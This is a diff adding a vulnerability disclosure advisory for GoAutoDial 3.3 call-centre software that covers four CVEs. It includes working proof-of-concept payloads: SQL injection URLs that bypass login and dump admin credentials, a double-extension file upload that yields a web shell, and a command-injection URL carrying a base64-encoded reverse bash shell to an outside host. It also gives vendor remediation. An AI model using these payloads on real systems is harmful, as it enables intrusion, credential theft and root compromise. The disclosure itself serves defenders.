@@ -1,0 +1,73 @@
+Affected software: GoAutoDial
+Affected version: 3.3-1406088000 (GoAdmin) and previous releases of GoAutodial 3.3
+Associated CVEs: CVE-2015-2842, CVE-2015-2843, CVE-2015-2844, CVE-2015-2845
+Vendor advisory: http://goautodial.org/news/21
+
+Abstract:
+Multiple vulnerabilties exist in the GoAutodial 3.3 open source call centre software that will lead to a complete compromise of the underlying database and infrastructure.
+
+Given that multiple product updates were released during testing that do not include any code changes related to the described vulnerabilities, any version between 3.3-1406088000 and 3.3-1421902800 might also be vulnerable.
+Refer to the product changelog.txt: https://github.com/goautodial/ce-www/blob/master/changelog.txt
+
+==================================
+1/ CVE-2015-2843 
+ -  SQLi authentication bypass due to lack of input sanitisation
+Affected file: go_login.php
+Issue: Lack of input sanitisation on input parameters user_name and user_pass prior to being handled by the database.
+
+A simple 'OR '1'='1 in the password field with a username of 'admin' will log you in. (assuming the default administrator user has not been removed).
+You can also test this by performing the following GET request:
+
+PoC:
+https://<ip>/go_login/validate_credentials/admin/' OR '1'='1
+ 
+ -  SQLi within the 'go_get_user_info' function
+Affected file: go_site.php
+Issue: Lack of input sanitisation on input parameters being handled by the database
+
+This function returns a single entry from the db that contains user information including the username and password. 
+Given that the first 'active' user in the db would most likely be the admin user you can search for active=Y. There is a column in the vicidial_users table that identifies whether a user is active (Y) or not active (N).
+Given this, you can perform the following to return an admin user's account username and password.
+
+PoC:
+https://<ip>/index.php/go_site/go_get_user_info/' or active='Y 
+
+==================================
+2/ CVE-2015-2842
+ -  Arbitrary file upload within the 'audiostore' upload functionality
+Affected file: go_audiostore.php
+Issue: Filename extensions are not properly checked to ensure only 'audio' files can be uploaded
+
+A user can upload a file with the filename 'bogus.wav.php'. The filename is checked for the '.wav' extension and the check is passed, however with the trailing '.php' file extension, much fun is obtained.
+An uploaded file is moved to a symlinked directory (/var/lib/asterisk/sounds) of which can be viewed directly from the browser. 
+Note*: All user uploaded files are given the 'go_' prefix. This example ends up with 'go_bogus.wav.php' as an uploaded file.
+
+https://<ip>/sounds/go_bogus.wav.php
+** Pop goes the shell **
+
+==================================
+3/ CVE-2015-2844 and CVE-2015-2845
+ - Arbitrary command injection via the cpanel function due to lack of input sanitisation
+Affected file: go_site.php
+Issue: User supplied parameters are passed to the php 'exec' function, of which the intended function can be escaped to do more sinister things.
+
+Two variables are passed to the underlying exec command, $action and $type. Either one can be used.
+URI looks like this: https://<ip>/index.php/go_site/cpanel/$type/$action
+
+Affected code: exec("/usr/share/goautodial/goautodialc.pl '/sbin/service $type ".strtolower($action)."'");
+
+Base64 encoding bypasses any web server encoding and a lovely root shell is obtained.
+** pop goes a root shell **
+reverse bash shell one liner: bash -i >& /dev/tcp/192.168.0.11/4444 0>&1 
+
+PoC:  
+https://<ip>/index.php/go_site/cpanel/|| bash -c "eval \`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTEvNDQ0NCAwPiYx | base64 --decode\`"  
+
+==================================
+Vulnerability Remediation
+
+Upgrade to version 3.3-1421902800 at a minimum.
+As per the vendor advisory, follow the instructions provided in the link below.
+http://goautodial.org/projects/goautodialce/wiki/GIThub
+
+Metasploit module to be created at some point  though quick and dirty python scripts work just fine too...
